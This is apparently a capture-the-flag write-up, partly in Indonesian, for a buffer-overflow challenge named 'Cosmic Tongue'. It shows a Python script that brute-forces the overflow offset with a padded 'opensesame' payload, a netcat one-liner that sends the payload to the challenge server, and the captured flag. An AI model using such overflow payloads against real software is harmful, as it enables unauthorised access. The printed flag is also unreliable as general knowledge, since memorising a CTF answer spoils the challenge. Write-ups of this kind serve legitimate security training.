## Cosmic Tongue - [211 point]
> Waiter, waiter! cast a meteor on this person NOW!

> Author: adieos

- Explanation
  <p>Jika Instance dijalankan</p>
  <img width="2520" height="345" alt="image" src="https://github.com/user-attachments/assets/652ba142-a9fc-4f84-8c35-92d615bbe8f1" />

### payload.py
```py


import subprocess
import sys

BINARY = "./chall"  
MIN_OFF = 0
MAX_OFF = 64

target_phrase = "By your word, the very bedrock doth tremble!" 
open_error = "Error opening flag.txt"

def try_payload(offset):
    payload = b"A" * offset + b"opensesame\x00"
    try:
       
        p = subprocess.run([BINARY], input=payload, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=1)
    except FileNotFoundError:
        print(f"[!] Binary tidak ditemukan: {BINARY}")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        return None, None

    out = p.stdout.decode(errors="ignore")
    err = p.stderr.decode(errors="ignore")
    return out, err

def main():
    found = []
    print(f"[+] Mencoba offsets {MIN_OFF}..{MAX_OFF} pada binary: {BINARY}\n")
    for off in range(MIN_OFF, MAX_OFF+1):
        out, err = try_payload(off)
        if out is None:
            print(f"[!] timeout saat mencoba offset {off}")
            continue
        hit = False
        reason = []
        if target_phrase in out:
            hit = True
            reason.append("triggered_second_branch")
        if open_error in out:
            
            reason.append("tried_open_flag")
            hit = True
        
        if "flag" in out.lower() or "CTF{" in out or "FLAG{" in out:
            reason.append("flag_like_output")
            hit = True

        if hit:
            print(f"[!] Offset {off} -> triggered ({', '.join(reason)})")
            print("----- stdout -----")
            print(out.strip())
            print("----- stderr -----")
            if err.strip():
                print(err.strip())
            print("------------------\n")
            found.append((off, out, err))
    if not found:
        print("[~] Tidak ada offset yang terdeteksi memicu cabang kedua dalam rentang yang dicoba.")
        print("[~] Coba rentang offset yang lebih besar, atau cek proteksi binary (ASLR/Canary/PIE).")
    else:
        print(f"[+] Selesai. ditemukan {len(found)} candidate(s). Periksa output di atas.")

if __name__ == "__main__":
    main()
  ```
<p>Payload ini langsung dijalankan dengan menembak ke Instance</p>

```sh
python3 - <<'PY' | nc intersec.hcs-team.com 10475
import sys
sys.stdout.buffer.write(b'A'*29 + b'opensesame\x00\n')
PY
```

<p><img width="1875" height="630" alt="image" src="https://github.com/user-attachments/assets/7c30b641-7051-4c49-9e1c-7356f07cdf21" />
</p>

## Flag = HCS{y0ur_w15hhh_15_my_c0mm4nd_51r3_d23e5d8e-dab3-4853-9d9a-c6b0e7a07dc6}









  <br>
  <br>

